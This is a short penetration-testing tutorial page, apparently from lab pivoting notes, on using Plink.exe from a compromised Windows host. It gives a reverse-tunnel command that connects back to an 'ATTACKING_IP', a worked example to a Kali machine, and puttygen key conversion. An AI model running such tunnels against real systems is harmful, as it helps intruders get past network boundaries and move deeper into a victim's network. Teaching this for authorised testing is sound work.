# Plink.exe

Plink.exe is essentially a version of the PuTTY SSH client that works with the Windows command line. Since Windows now comes with it's own inbuilt SSH client it is essentially a fairly useless tool for modern systems however, it can still come in handy so it's worth knowing how to use or atleast knowing about so that it can be an option if needed

Since Windows servers are unlikely to have an SSH server running Plink can be utilised to create a reverse connection by transfering the binary then constructing a command such as this: **cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N**. The start of this command **cmd.exe /c echo y** is in place to get around the warning message that the target has not connected to this host before. It's mainly for non-interactive shells i.e most reverse shells, given Windows shells are difficult to stabalise

Using this command with our example network we used in the previous section. Say we have access to **172.16.0.5** and wish to forward a connection to **172.16.0.10:80** back to port **8000** on our own attacking machine at **172.16.0.20**, we could use the command like this: **cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N**

Keys generated using **ssh-keygen** will not work here so you will need to use a tool called puttygen. which can be installed on kali easily (**sudo apt install putty-tools**). Conversion can then be done by doing puttygen **KEYFILE -o OUTPUT_KEY.ppk**

You would then transfer the **.ppk** file to the target machine and use it in the same way that you did the reverse port forwarding in the previous section with all **authorised_keys** still intact despite the private key being converted

Plink can be downloaded from the following link: [Download Here.](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) Plink is notorious for going out of date so whilst it is already installed on Kali at **/usr/share/windows-resources/binaries/plink.exe** it's worth redownloading before use


